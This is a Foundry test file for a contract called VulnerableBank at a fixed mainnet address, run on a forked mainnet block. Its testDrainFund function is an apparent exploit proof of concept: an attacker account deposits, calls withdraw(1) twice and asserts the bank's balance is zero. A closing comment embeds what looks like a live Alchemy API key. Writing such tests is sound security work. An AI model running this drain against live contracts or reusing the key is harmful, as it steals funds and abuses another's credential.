// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {VulnerableBank} from "../../src/VulnerableBank/VulnerableBank.sol";

contract VulnerableBankTest is Test {
    VulnerableBank bank;
    address attacker;

    function setUp() public {
        attacker = address(
            uint160(uint256(keccak256(abi.encodePacked("attacker"))))
        );
        vm.deal(attacker, 1 ether);
        vm.label(attacker, "attacker");
        bank = VulnerableBank(0x970c48a82046926330922Da0bf4C54bc4917aB73);
    }

    function testDrainFund() public {
        vm.startPrank(attacker);
        bank.deposit{value: 0.014 ether}();
        bank.deposit();
        bank.withdraw(1);
        bank.withdraw(1);
        assertEq(address(bank).balance, 0);
    }
}

// forge test --match-contract VulnerableBank --fork-url "https://eth-mainnet.g.alchemy.com/v2/7Mo08KJOJvy7jAI1GzVx2LuXeLuYqz7E" --fork-block-number 15731098
